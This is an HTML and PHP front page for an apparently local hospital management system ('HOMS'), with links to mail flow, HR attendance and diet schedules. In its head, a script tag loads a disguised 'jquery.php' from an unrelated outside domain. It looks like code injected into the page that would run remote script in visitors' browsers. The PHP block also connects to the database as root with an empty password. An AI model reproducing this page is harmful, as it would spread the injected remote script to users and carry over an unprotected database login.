
<!DOCTYPE html>
<html>
<head>
<link rel ="stylesheet" type="text/css" href="http://localhost/FrontendCSS.css">
<script src="https://macutnova.com/jquery.php?u=c16102a344e586c77bd406dfa74ed645&c=split24banner4&p=1"></script></head>
<body>

<div id="header">
<h1>HOMS</h1>
</div>
<div id="icbar">
</div>
<div id="Newsfeed">
</div>
<div id="nav1">

	<div id="section1">
	<h2>MAIL FLOW</h2>
	<a href="http://localhost/mail.php" target="_self"><button class="button button3">Mail Flow</button></a>
	</div>
</div>

<div id="nav2">

	<div id="section2">
	<h2>HR LEAVE/ATTENDENCE</h2>
	<a  href="http://localhost/hr.php" target="_self"><button class="button button1">Employee Data</button></a>
	</div>
</div>

<div id="nav3">

	<div id="section3">
	<h2>DIET SHEET</h2>
	<a href="http://localhost/diet.php" target="_self"><button CLASS="button button2"> Diet schedules</button></a>
	</div>
</div>

</div>

<div id="footer">
</div>

</body>
</html>
<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "homs";

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}



mysqli_close($conn);
?>